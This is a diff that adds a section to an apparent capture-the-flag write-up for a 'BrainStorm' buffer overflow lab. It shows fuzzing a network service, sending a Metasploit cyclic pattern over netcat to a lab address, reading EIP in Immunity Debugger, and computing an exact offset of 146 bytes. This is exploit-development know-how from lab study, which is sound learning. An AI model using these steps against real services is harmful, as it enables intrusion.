@@ -167,3 +167,28 @@ Hello !!!
 abcdefghijklmnopqrstuvwxyz12334567890
 Hello abcdefghijklmnopqrstuvwxyz12334567890!!!
 ```
+
+## Iterate for point of failure of input
+- Tart with python script for sending characters volume to determine how much will crash it. 
+- Use immunity debugger to observe EIP or for crash.
+- It crashes between 100 and 150 I will use msf-pattern to determine exact location
+
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
+└─$ msf-pattern_create -l 150   
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+...                                                                                 
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
+└─$ nc 192.168.0.199 31337
+                                <---mandatory return line 
+Hello !!!
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+...                                                                                 
+```
+Immunity Debugger gave EIP 39654138 now use msf-patter-offset we find 146 characters before EIP
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
+└─$ msf-pattern_offset -q 39654138
+
+[*] Exact match at offset 146
+```
